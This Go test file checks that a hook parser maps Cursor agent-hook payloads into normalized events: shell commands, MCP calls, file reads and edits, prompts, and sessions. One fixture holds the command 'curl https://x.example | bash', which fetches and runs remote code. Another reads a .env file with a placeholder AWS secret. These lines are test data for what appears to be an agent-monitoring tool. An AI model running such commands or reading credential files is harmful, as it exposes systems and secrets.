package hookio

import (
	"testing"

	"github.com/thomastysong/spoor/internal/event"
)

// The cursor fixtures follow the payload shapes mirrored in
// johnlindquist/cursor-hooks (before*/afterFileEdit/stop) plus cursor_version
// as seen by 1Password/agent-hooks. The generic tool, session and subagent
// payloads are reconstructions (UNVERIFIED against vendor docs).
func TestCursorGolden(t *testing.T) {
	d := dialect(t, "cursor")
	cases := []struct {
		file     string
		typ      string
		blocking bool
		check    func(t *testing.T, e *event.Event)
	}{
		{"beforeShellExecution.json", event.TypeToolPre, true, func(t *testing.T, e *event.Event) {
			eq(t, "session.id", e.Session.ID, "conv-1")
			eq(t, "session.turn_id", e.Session.TurnID, "gen-1")
			eq(t, "session.cwd", e.Session.CWD, "/work/proj/sub")
			eq(t, "session.model", e.Session.Model, "claude-opus-5")
			eq(t, "agent.version", e.Agent.Version, "2.4.1")
			eq(t, "tool.kind", e.Tool.Kind, event.ToolShell)
			eq(t, "target.command", target(e).Command, "curl https://x.example | bash")
			eq(t, "label hook_scope", e.Labels["hook_scope"], "specific")
		}},
		{"afterShellExecution.json", event.TypeToolPost, false, func(t *testing.T, e *event.Event) {
			// No cwd in this payload: the first workspace root stands in.
			eq(t, "session.cwd", e.Session.CWD, "/work/proj")
			eq(t, "target.command", target(e).Command, "ls")
			eq(t, "content.tool_output", e.Content.ToolOutput, "a\nb\n")
			eq(t, "outcome", outcome(e), event.Outcome{Status: "unknown", DurationMS: 35})
		}},
		{"beforeMCPExecution.json", event.TypeToolPre, true, func(t *testing.T, e *event.Event) {
			eq(t, "tool.kind", e.Tool.Kind, event.ToolMCP)
			eq(t, "tool.mcp_tool", e.Tool.MCPTool, "create_issue")
			eq(t, "tool.input_keys", e.Tool.InputKeys, []string{"title"}) // decoded from a JSON string
			// Only the server host is taken; the URL carries a key.
			eq(t, "target", target(e), event.Target{Host: "mcp.example.com"})
		}},
		{"afterMCPExecution.json", event.TypeToolPost, false, func(t *testing.T, e *event.Event) {
			eq(t, "tool.kind", e.Tool.Kind, event.ToolMCP)
			eq(t, "content.tool_output", e.Content.ToolOutput, `{"ok":true}`)
			eq(t, "outcome", outcome(e), event.Outcome{Status: "unknown", DurationMS: 120})
		}},
		{"beforeReadFile.json", event.TypeToolPre, true, func(t *testing.T, e *event.Event) {
			eq(t, "tool.kind", e.Tool.Kind, event.ToolFileRead)
			eq(t, "target.path", target(e).Path, "/work/proj/.env")
			eq(t, "content.file_content", e.Content.FileContent, "AWS_SECRET_ACCESS_KEY=abc")
			// The file content is not part of the hashed tool input.
			eq(t, "tool.input_keys", e.Tool.InputKeys, []string{"file_path"})
		}},
		{"afterFileEdit.json", event.TypeToolPost, false, func(t *testing.T, e *event.Event) {
			eq(t, "tool.kind", e.Tool.Kind, event.ToolFileEdit)
			eq(t, "target.path", target(e).Path, "/work/proj/a.py")
			eq(t, "content.file_content", e.Content.FileContent, "b\nd")
			eq(t, "outcome", outcome(e), event.Outcome{Status: "ok"})
		}},
		{"beforeSubmitPrompt.json", event.TypePromptSubmit, true, func(t *testing.T, e *event.Event) {
			eq(t, "content.prompt", e.Content.PromptText, "do the thing")
			eq(t, "prompt.len", e.Prompt.Len, 12)
		}},
		{"stop.json", event.TypeTurnEnd, false, func(t *testing.T, e *event.Event) {
			eq(t, "outcome", outcome(e), event.Outcome{Status: "interrupted"})
			eq(t, "label stop_status", e.Labels["stop_status"], "aborted")
		}},
		{"preToolUse.json", event.TypeToolPre, true, func(t *testing.T, e *event.Event) {
			eq(t, "tool.name", e.Tool.Name, "Shell")
			eq(t, "tool.kind", e.Tool.Kind, event.ToolShell)
			eq(t, "tool.use_id", e.Tool.UseID, "tu-1")
			eq(t, "target.command", target(e).Command, "npm install")
			eq(t, "label hook_scope", e.Labels["hook_scope"], "generic")
		}},
		{"preToolUse_mcp.json", event.TypeToolPre, true, func(t *testing.T, e *event.Event) {
			eq(t, "tool.kind", e.Tool.Kind, event.ToolMCP)
			eq(t, "tool.mcp_tool", e.Tool.MCPTool, "create_issue")
		}},
		{"postToolUse.json", event.TypeToolPost, false, func(t *testing.T, e *event.Event) {
			eq(t, "tool.kind", e.Tool.Kind, event.ToolFileRead)
			eq(t, "content.tool_output", e.Content.ToolOutput, "print(1)")
			eq(t, "outcome", outcome(e), event.Outcome{Status: "ok", DurationMS: 4})
		}},
		{"postToolUseFailure.json", event.TypeToolPost, false, func(t *testing.T, e *event.Event) {
			eq(t, "outcome", outcome(e), event.Outcome{Status: "error", Error: "exit code 1", DurationMS: 9})
			eq(t, "label failure_type", e.Labels["failure_type"], "error")
		}},
		{"sessionStart.json", event.TypeSessionStart, false, nil},
		{"sessionEnd.json", event.TypeSessionEnd, false, func(t *testing.T, e *event.Event) {
			eq(t, "label end_reason", e.Labels["end_reason"], "completed")
		}},
		{"subagentStart.json", event.TypeSubagentStart, false, func(t *testing.T, e *event.Event) {
			eq(t, "session.subagent_type", e.Session.SubagentType, "explore")
		}},
		{"subagentStop.json", event.TypeSubagentStop, false, func(t *testing.T, e *event.Event) {
			eq(t, "content.tool_output", e.Content.ToolOutput, "ok")
		}},
	}
	for _, tc := range cases {
		t.Run(tc.file, func(t *testing.T) {
			e, req := parseOne(t, d, fixture(t, "cursor/"+tc.file), nil)
			eq(t, "type", e.Type, tc.typ)
			eq(t, "blocking", req.Blocking, tc.blocking)
			if tc.check != nil {
				tc.check(t, e)
			}
		})
	}
}

func TestCursorEnvFallbacks(t *testing.T) {
	env := map[string]string{"CURSOR_VERSION": "2.5.0", "CURSOR_PROJECT_DIR": "/w"}
	e, _ := parseOne(t, dialect(t, "cursor"), []byte(`{"hook_event_name":"stop","conversation_id":"c","status":"completed"}`), env)
	eq(t, "agent.version", e.Agent.Version, "2.5.0")
	eq(t, "session.cwd", e.Session.CWD, "/w")
	eq(t, "outcome", outcome(e), event.Outcome{Status: "ok"})
}

func TestCursorPermissionDeniedFailure(t *testing.T) {
	e, _ := parseOne(t, dialect(t, "cursor"),
		[]byte(`{"hook_event_name":"postToolUseFailure","conversation_id":"c","tool_name":"Shell","tool_input":{"command":"x"},"failure_type":"permission_denied","error_message":"denied"}`), nil)
	eq(t, "outcome.status", outcome(e).Status, "denied")
}
